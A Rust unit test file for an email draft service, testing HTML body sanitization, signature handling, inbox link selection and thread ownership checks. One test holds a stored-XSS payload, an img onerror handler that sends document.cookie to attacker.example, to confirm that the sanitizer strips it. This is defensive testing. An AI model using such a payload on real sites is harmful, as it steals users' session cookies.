use super::*;
use base64::engine::general_purpose::URL_SAFE_NO_PAD;

fn input_with_body_html(html: &str) -> CreateDraftInput {
    CreateDraftInput {
        db_id: None,
        provider_id: None,
        replying_to_id: None,
        provider_thread_id: None,
        thread_db_id: None,
        subject: String::new(),
        to: vec![],
        cc: vec![],
        bcc: vec![],
        body_text: None,
        body_html: Some(URL_SAFE_NO_PAD.encode(html)),
        body_macro: None,
        headers_json: None,
        send_time: None,
        include_signature: None,
        actor: None,
    }
}

#[test]
fn sanitizes_the_decoded_body() {
    // Stored XSS: this body is rendered via innerHTML by every user the thread
    // is shared with, so the handler must not survive the round trip.
    let mut input = input_with_body_html(
        r#"<body><p>hello</p><img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)"></body>"#,
    );

    decode_and_sanitize_html_body(&mut input).expect("decodes");

    let body = input.body_html.expect("body kept");
    assert!(body.contains("<p>hello</p>"), "got: {body}");
    assert!(
        !body.to_ascii_lowercase().contains("onerror"),
        "got: {body}"
    );
    assert!(!body.contains("attacker.example"), "got: {body}");
}

#[test]
fn keeps_signature_marker_so_injection_stays_idempotent() {
    // Sanitization runs before maybe_inject_signature; if the marker class were
    // stripped, has_signature would miss a client-baked signature and we would
    // append a second one.
    let mut input =
        input_with_body_html(r#"<p>hi</p><div class="macro-email-signature"><p>Regards</p></div>"#);

    decode_and_sanitize_html_body(&mut input).expect("decodes");

    let body = input.body_html.expect("body kept");
    assert!(super::super::signature::has_signature(&body), "got: {body}");
}

#[test]
fn missing_body_html_is_left_alone() {
    let mut input = input_with_body_html("<p>x</p>");
    input.body_html = None;

    decode_and_sanitize_html_body(&mut input).expect("decodes");

    assert!(input.body_html.is_none());
}

fn test_link(id: Uuid, owner: &str, email: &str, is_primary: bool) -> Link {
    use crate::domain::models::UserProvider;
    Link {
        id,
        macro_id: macro_user_id::user_id::MacroUserIdStr::try_from_email(owner).unwrap(),
        fusionauth_user_id: "fa-user".to_string(),
        email_address: macro_user_id::email::EmailStr::try_from(email.to_string()).unwrap(),
        provider: UserProvider::Gmail,
        is_sync_active: true,
        is_primary,
        created_at: chrono::Utc::now(),
        updated_at: chrono::Utc::now(),
    }
}

fn caller() -> macro_user_id::user_id::MacroUserIdStr<'static> {
    macro_user_id::user_id::MacroUserIdStr::try_from_email("user@test.com").unwrap()
}

#[test]
fn explicit_link_id_selects_accessible_link() {
    let id1 = Uuid::from_u128(1);
    let id2 = Uuid::from_u128(2);
    let links = vec![
        test_link(id1, "user@test.com", "user@test.com", true),
        test_link(id2, "user@test.com", "other@test.com", false),
    ];
    let resolved = resolve_target_link(&links, Some(id2), &caller()).unwrap();
    assert_eq!(resolved.id, id2);
}

#[test]
fn explicit_link_id_outside_accessible_set_is_rejected() {
    let links = vec![test_link(
        Uuid::from_u128(1),
        "user@test.com",
        "user@test.com",
        true,
    )];
    let result = resolve_target_link(&links, Some(Uuid::from_u128(99)), &caller());
    assert!(matches!(result, Err(EmailErr::InboxNotFound)));
}

#[test]
fn no_link_id_falls_back_to_callers_primary() {
    let primary = Uuid::from_u128(1);
    let links = vec![
        test_link(
            Uuid::from_u128(2),
            "user@test.com",
            "secondary@test.com",
            false,
        ),
        test_link(primary, "user@test.com", "user@test.com", true),
    ];
    let resolved = resolve_target_link(&links, None, &caller()).unwrap();
    assert_eq!(resolved.id, primary);
}

#[test]
fn delegated_primary_is_never_the_callers_default() {
    // A delegated inbox is primary for its own account; without the macro_id
    // guard it would be picked as the caller's default target.
    let own_primary = Uuid::from_u128(1);
    let links = vec![
        test_link(
            Uuid::from_u128(2),
            "delegator@test.com",
            "delegator@test.com",
            true,
        ),
        test_link(own_primary, "user@test.com", "user@test.com", true),
    ];
    let resolved = resolve_target_link(&links, None, &caller()).unwrap();
    assert_eq!(resolved.id, own_primary);
}

#[test]
fn no_link_id_and_no_primary_is_rejected() {
    let result = resolve_target_link(&[], None, &caller());
    assert!(matches!(result, Err(EmailErr::InboxNotFound)));
}

fn thread_row(link_id: Uuid, provider_id: Option<&str>) -> ThreadRow {
    let now = chrono::Utc::now();
    ThreadRow {
        db_id: Uuid::from_u128(0xbeef),
        provider_id: provider_id.map(str::to_owned),
        link_id,
        inbox_visible: true,
        is_read: true,
        latest_inbound_message_ts: None,
        latest_outbound_message_ts: None,
        latest_non_spam_message_ts: None,
        created_at: now,
        updated_at: now,
        project_id: None,
    }
}

#[test]
fn thread_hint_attaches_to_an_owned_thread_and_adopts_its_provider_id() {
    let link_id = Uuid::from_u128(1);
    let thread = thread_row(link_id, Some("provider-7"));
    let outcome = resolve_thread_hint(Some(&thread), link_id, thread.db_id).unwrap();
    match outcome {
        ThreadHintOutcome::Attach { provider_thread_id } => {
            assert_eq!(provider_thread_id.as_deref(), Some("provider-7"));
        }
        ThreadHintOutcome::CreateWithId(_) => panic!("expected attach"),
    }
}

#[test]
fn thread_hint_owned_by_another_inbox_is_rejected_opaquely() {
    let thread = thread_row(Uuid::from_u128(2), None);
    let result = resolve_thread_hint(Some(&thread), Uuid::from_u128(1), thread.db_id);
    assert!(matches!(result, Err(EmailErr::ThreadNotFound)));
}

#[test]
fn unclaimed_thread_hint_creates_with_the_client_id() {
    let hint = Uuid::from_u128(0xc0ffee);
    let outcome = resolve_thread_hint(None, Uuid::from_u128(1), hint).unwrap();
    match outcome {
        ThreadHintOutcome::CreateWithId(id) => assert_eq!(id, hint),
        ThreadHintOutcome::Attach { .. } => panic!("expected create"),
    }
}
